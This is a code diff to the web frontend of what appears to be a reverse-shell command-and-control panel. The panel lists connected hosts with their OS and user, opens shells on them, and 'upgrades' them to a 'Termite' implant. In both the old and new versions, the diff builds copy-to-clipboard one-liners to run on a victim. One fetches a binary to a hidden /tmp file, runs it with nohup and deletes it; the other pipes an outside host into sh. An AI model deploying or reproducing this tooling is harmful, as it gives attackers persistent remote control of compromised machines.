@@ -49,116 +49,13 @@ let apiUrl = [baseUrl, "/api"].join("");
 let wsUrl = ["ws://", endPoint, "/notify"].join("");
 
 
-function upgradeToTermite(hash) {
+function upgradeToTermite(clientHash, serverHash) {
   axios
-    .get(apiUrl + "/client/" + hash + "/upgrade")
+    .get(apiUrl + "/client/" + clientHash + "/upgrade/" + serverHash)
     .then((response) => {
       console.log(response)
     })
 }
-
-const columns = [
-  {
-    title: "Address",
-    dataIndex: "host",
-    key: "host",
-    align: "center",
-    render: (data, line, index) => {
-      return (
-        <Tooltip title={"Hash:" + line.hash}>
-          <span>{line.host + ":" + line.port}</span>
-        </Tooltip>
-      );
-    },
-  },
-  {
-    title: "OS",
-    dataIndex: "os",
-    key: "os",
-    align: "center",
-    render: (data) => {
-      switch (data) {
-        case 1:
-          return "Linux";
-        case 2:
-          return "Windows";
-        case 3:
-          return "SunOS";
-        case 4:
-          return "MacOS";
-        case 5:
-          return "FreeBSD";
-        default:
-          return "Unknown Operating System";
-      }
-    },
-  },
-  {
-    title: "Username",
-    dataIndex: "user",
-    key: "user",
-    align: "center",
-    render: (data) => {
-      let color = "green";
-      if (data === "root") {
-        color = "red";
-      }
-      return <Tag color={color}>{data}</Tag>;
-    },
-  },
-  {
-    title: "Online Time",
-    dataIndex: "timestamp",
-    key: "timestamp",
-    align: "center",
-    render: (data) => {
-      return "Onlined at " + moment(data).fromNow();
-    },
-  },
-  {
-    title: "Action",
-    key: "x",
-    render: (data, line, index) => {
-      let upgradeButton;
-      if (line.CurrentProcessKey === undefined) {
-        upgradeButton = <Button onClick={() => upgradeToTermite(line.hash)}>
-            Upgrade
-        </Button>
-      } else {
-        upgradeButton = ""
-      }
-
-      return (
-        <>
-          <Button>
-            <a
-              href={baseUrl + "/shell/?" + line.hash}
-              target={"_blank"}
-              rel={"noreferrer noopener"}
-            >
-              Shell
-          </a>
-          </Button>
-          {upgradeButton}
-        </>
-      );
-    },
-  },
-  {
-    title: "Progress",
-    dataIndex: "progress",
-    key: "progress",
-    align: "center",
-    render: (data, line, index) => {
-    return <>
-    <Alert message={line.alert === undefined ? "Press Upgrade to Proceed" : line.alert } type="success" />
-    <Progress percent={line.compiling_progress} size="small" status={line.compiling_progress === 100 ? "" : "active"} />
-    <Progress percent={line.compressing_progress} size="small" status={line.compressing_progress === 100 ? "" : "active"} />
-    <Progress percent={Math.round(line.progress)} size="small" status={line.progress === 100 ? "" : "active"} />
-    </>
-    },
-  }
-];
 
 class App extends React.Component {
   constructor(props) {
@@ -213,7 +110,7 @@ class App extends React.Component {
       let data = JSON.parse(e.data);
 
       let serverHash, clientHash, newServersMap
-      
+
       switch (data.Type) {
         case CLIENT_CONNECTED:
           console.log(data);
@@ -265,7 +162,7 @@ class App extends React.Component {
           clientHash = compilingProgress.Client.hash;
           serverHash = compilingProgress.ServerHash;
           let cp = compilingProgress.Progress
-          
+
           newServersMap = this.state.serversMap;
           newServersMap[serverHash].clients[clientHash].compiling_progress = cp
           if (newServersMap[serverHash].clients[clientHash].compiling_progress === 100) {
@@ -326,6 +223,124 @@ class App extends React.Component {
   }
 
   render() {
+
+    const columns = [
+      {
+        title: "Address",
+        dataIndex: "host",
+        key: "host",
+        align: "center",
+        render: (data, line, index) => {
+          return (
+            <Tooltip title={"Hash:" + line.hash}>
+              <span>{line.host + ":" + line.port}</span>
+            </Tooltip>
+          );
+        },
+      },
+      {
+        title: "OS",
+        dataIndex: "os",
+        key: "os",
+        align: "center",
+        render: (data) => {
+          switch (data) {
+            case 1:
+              return "Linux";
+            case 2:
+              return "Windows";
+            case 3:
+              return "SunOS";
+            case 4:
+              return "MacOS";
+            case 5:
+              return "FreeBSD";
+            default:
+              return "Unknown Operating System";
+          }
+        },
+      },
+      {
+        title: "Username",
+        dataIndex: "user",
+        key: "user",
+        align: "center",
+        render: (data) => {
+          let color = "green";
+          if (data === "root") {
+            color = "red";
+          }
+          return <Tag color={color}>{data}</Tag>;
+        },
+      },
+      {
+        title: "Online Time",
+        dataIndex: "timestamp",
+        key: "timestamp",
+        align: "center",
+        render: (data) => {
+          return "Onlined at " + moment(data).fromNow();
+        },
+      },
+      {
+        title: "Action",
+        key: "x",
+        render: (data, line, index) => {
+          let upgradeButton;
+          if (line.CurrentProcessKey === undefined) {
+            let encryptedServerHash = null
+            this.state.serversList.forEach(function(entry){
+              if (entry.encrypted) {
+                encryptedServerHash = entry.hash
+              }
+            })
+            if (encryptedServerHash == null) {
+              upgradeButton = <Button disabled={true} onClick={() => upgradeToTermite(line.hash, encryptedServerHash)}>
+              Upgrade
+            </Button>
+
+            } else {
+              upgradeButton = <Button onClick={() => upgradeToTermite(line.hash, encryptedServerHash)}>
+              Upgrade
+            </Button>
+            }
+          } else {
+            upgradeButton = ""
+          }
+    
+          return (
+            <>
+              <Button>
+                <a
+                  href={baseUrl + "/shell/?" + line.hash}
+                  target={"_blank"}
+                  rel={"noreferrer noopener"}
+                >
+                  Shell
+              </a>
+              </Button>
+              {upgradeButton}
+            </>
+          );
+        },
+      },
+      {
+        title: "Progress",
+        dataIndex: "progress",
+        key: "progress",
+        align: "center",
+        render: (data, line, index) => {
+          return <>
+            <Alert message={line.alert === undefined ? "Press Upgrade to Proceed" : line.alert} type="success" />
+            <Progress percent={line.compiling_progress} size="small" status={line.compiling_progress === 100 ? "" : "active"} />
+            <Progress percent={line.compressing_progress} size="small" status={line.compressing_progress === 100 ? "" : "active"} />
+            <Progress percent={Math.round(line.progress)} size="small" status={line.progress === 100 ? "" : "active"} />
+          </>
+        },
+      }
+    ];
+    
+
     let interfaceMenu;
     if (this.state.currentServer === null) {
       interfaceMenu = (
@@ -383,60 +398,60 @@ class App extends React.Component {
       let hintTabs
       if (this.state.currentServer.encrypted) {
         hintTabs = <Tabs defaultActiveKey="0">
-        {this.state.distributor.interfaces.map((value, index) => {
-          let url = "http://" + value + ":" + this.state.distributor.port
-          let command, filename, path
-          let data = []
-          Object.values(this.state.currentServer.interfaces).map((value, index) => {
-            filename = "/tmp/." + randomstring.generate(4)
-            path = this.state.distributor.route[value]
-            command = "curl -fsSL " + url + "/" + path + "/termite -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &' && rm -rf " + filename
-            data.push({target: value + ":" + this.state.currentServer.port, command: command})
-            return command
-          })
+          {this.state.distributor.interfaces.map((value, index) => {
+            let url = "http://" + value + ":" + this.state.distributor.port
+            let command, filename, path
+            let data = []
+            Object.values(this.state.currentServer.interfaces).map((value, index) => {
+              filename = "/tmp/." + randomstring.generate(4)
+              path = this.state.distributor.route[value + ":" + this.state.currentServer.port]
+              command = "curl -fsSL " + url + "/" + path + "/termite -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &' && rm -rf " + filename
+              data.push({ target: value + ":" + this.state.currentServer.port, command: command })
+              return command
+            })
 
-          let commands =     <List
-          size="small"
-          header={<div>Termite oneline command</div>}
-          footer={<div></div>}
-          bordered
-          dataSource={data}
-          renderItem={item => <List.Item>
-              {"Connect back: " + item.target}
-              <Input addonAfter={<CopyToClipboard
-                text={item.command}
-                onCopy={() => this.setState({ copied: true })}
-              >
-              <button>Click to copy</button>
-              </CopyToClipboard>
-              } defaultValue={item.command} />
-          </List.Item>}
-        />
+            let commands = <List
+              size="small"
+              header={<div>Termite oneline command</div>}
+              footer={<div></div>}
+              bordered
+              dataSource={data}
+              renderItem={item => <List.Item>
+                {"Connect back: " + item.target}
+                <Input addonAfter={<CopyToClipboard
+                  text={item.command}
+                  onCopy={() => this.setState({ copied: true })}
+                >
+                  <button>Click to copy</button>
+                </CopyToClipboard>
+                } defaultValue={item.command} />
+              </List.Item>}
+            />
 
-          return (
-            <TabPane tab={value} key={index}>
-              {commands}
-            </TabPane>
-          );
-        })}
-      </Tabs>
+            return (
+              <TabPane tab={value} key={index}>
+                {commands}
+              </TabPane>
+            );
+          })}
+        </Tabs>
       } else {
         hintTabs = <Tabs defaultActiveKey="0">
-        {this.state.currentServer.interfaces.map((value, index) => {
-          let command = "curl http://" + value + ":" + this.state.currentServer.port + "|sh"
-          return (
-            <TabPane tab={value} key={index}>
-              <Tag>{command}</Tag>
-              <CopyToClipboard
-                text={command}
-                onCopy={() => this.setState({ copied: true })}
-              >
-                <button>Click to copy</button>
-              </CopyToClipboard>
-            </TabPane>
-          );
-        })}
-      </Tabs>
+          {this.state.currentServer.interfaces.map((value, index) => {
+            let command = "curl http://" + value + ":" + this.state.currentServer.port + "|sh"
+            return (
+              <TabPane tab={value} key={index}>
+                <Tag>{command}</Tag>
+                <CopyToClipboard
+                  text={command}
+                  onCopy={() => this.setState({ copied: true })}
+                >
+                  <button>Click to copy</button>
+                </CopyToClipboard>
+              </TabPane>
+            );
+          })}
+        </Tabs>
       }
       hint = (
         <div>
